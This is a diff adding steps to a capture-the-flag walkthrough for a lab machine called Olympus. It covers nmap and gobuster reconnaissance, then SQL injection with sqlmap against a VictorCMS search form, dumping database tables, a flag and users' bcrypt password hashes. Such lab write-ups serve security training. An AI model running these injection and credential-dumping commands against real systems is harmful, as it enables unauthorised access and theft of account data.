@@ -7,4 +7,71 @@ Target IP: 10.10.83.227
 Step 1: Start the target machine by pressing the green "Start Machine" button. Give it five minutes to start up.
 After a few minutes you should see your target IP.Ours is 10.10.83.227
 
+Step 2: Recon
+Preform Nmap scan against the target IP address. ($ nmap -nmap -sV -O -A -v)
+We see there are two open opets
+22/tcp ssh
+80/tcp http.
 
+Step 3: Visit the webpage.
+When we type in 10.10.83.227 into our URL we get an error message. However we can see that the URL changed to text 'olympus.thm'
+Let's add this website to our hosts list ($ nano /etc/hosts) (add the following text at the bottom of the file:
+10.10.83.227 olympus.thm). After we add the DNS name to the IP address in the host file, 
+we can try again and we get a hit!
+We can see that the website is under development, there is a message with email address root@the-it-department.
+It also states the old version of the website is still accessible on this domain.
+
+Step 4: Use Gobuster to enumurate website's directories. 
+We will be using the SecLists common webcontent discovery list.
+(gobuster dir -u olympus.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt)
+
+We find one directory that we have access too, olympus.thm/~webmaster. It is the first version of the website.
+Most of this website does not work as well, but there some useful bits of info. The most useful fild is the search bar.
+
+Step 5: SQL Injection
+When trying to get an sql error we can see that the data on this site is stored on MySQL on VictorCMS. 
+We can use exploitDB to find that VictorCMS has a known search exploit that we can use.
+($ sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3)
+
+We find six available databases [6]:
+[*] information_schema
+[*] mysql
+[*] olympus
+[*] performance_schema
+[*] phpmyadmin
+[*] sys
+
+Try getting the tables from olympus database.
+($ ─# sqlmap -u "http://olympus.thm/~webmaster/search.php" --data="search=1337*&submit=" -D olympus --tables)
+
+Database: olympus
+[6 tables]
++------------+
+| categories |
+| chats      |
+| comments   |
+| flag       |
+| posts      |
+| users      |
++------------+
+
+Lets get the first flag now. 
+flag{Sm4rt!_k33P_d1gGIng} 
+
+Table: users
+[3 entries]
++---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
+| user_id | randsalt | user_name  | user_role | user_email             | user_image | user_lastname | user_password                                                | user_firstname |
++---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
+| 3       | <blank>  | prometheus | User      | prometheus@olympus.thm | <blank>    | <blank>       | $2y$10$YC6uoMwK9VpB5QL513vfLu1RV2sgBf01c0lzPHcz1qK2EArDvnj3C | prometheus     |
+| 6       | dgas     | root       | Admin     | root@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$lcs4XWc5yjVNsMb4CUBGJevEkIuWdZN3rsuKWHCc.FGtapBAfW.mK | root           |
+| 7       | dgas     | zeus       | User      | zeus@chat.olympus.thm  | <blank>    | <blank>       | $2y$10$cpJKDXh2wlAI5KlCsUaLCOnf0g5fiG0QSUS53zp/r0HMtaj6rT4lC | zeus           |
++---------+----------+------------+-----------+------------------------+------------+---------------+--------------------------------------------------------------+----------------+
+
+Chats
+| 2022-04-05 | Attached : prometheus_password.txt | 47c3210d51761686f3af40a875eeaaea.txt | prometheus
+
+Comments
+Heyyy ! You've done a damn good but unsecured job ^^\r\n\r\nI've patched a few things on my way, but I managed to hack my self into the olympus !\r\n\r\ncheerio ! \r\n=P |
+
+We have found user emails and password hashs in the users table.
